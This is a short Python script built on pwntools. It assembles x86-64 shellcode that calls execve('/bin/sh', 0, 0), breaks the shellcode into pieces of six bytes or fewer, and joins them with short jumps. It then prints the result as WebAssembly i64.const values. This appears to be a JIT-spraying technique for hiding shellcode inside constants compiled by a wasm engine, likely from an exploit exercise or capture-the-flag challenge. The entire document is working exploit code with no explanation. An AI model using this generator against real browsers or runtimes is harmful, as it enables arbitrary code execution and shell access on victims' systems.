from pwn import *
from struct import unpack

context(arch="amd64")

shellcodes = []
push = lambda shellcode: shellcodes.append(asm(shellcode))

sh = unpack("<I", b"/sh\x00")[0]
push("xor rdi, rdi")
push(f"mov edi, {sh}")
push("shl rdi, 32")

bin = unpack("<I", b"/bin")[0]
push("xor rsi, rsi")
push(f"mov esi, {bin}")
push("add rdi, rsi")

push("push rdi")
push("mov rdi, rsp")  # rdi == "/bin/sh"

push("xor rsi, rsi")  # rsi == 0

push("xor rdx, rdx")  # rdx == 0

push("xor rax, rax")
push(f"mov al, {constants.SYS_execve}")  # rax == SYS_execve

push("syscall")  # syscall => execve("/bin/sh", 0, 0)
push("ret")


# chaining

jmp = b"\xeb\x02"  # jmp 0x2
nop = b"\x90"

segment = b""
print_segment = lambda: print(f"i64.const {hex(unpack('<Q', segment)[0])}")

for shellcode in shellcodes:
    assert len(shellcode) <= 6

    if len(segment) + len(shellcode) <= 6:
        segment += shellcode
        continue

    segment = segment.ljust(6, nop) + jmp
    print_segment()
    segment = shellcode

segment = segment.ljust(8, nop)
print_segment()
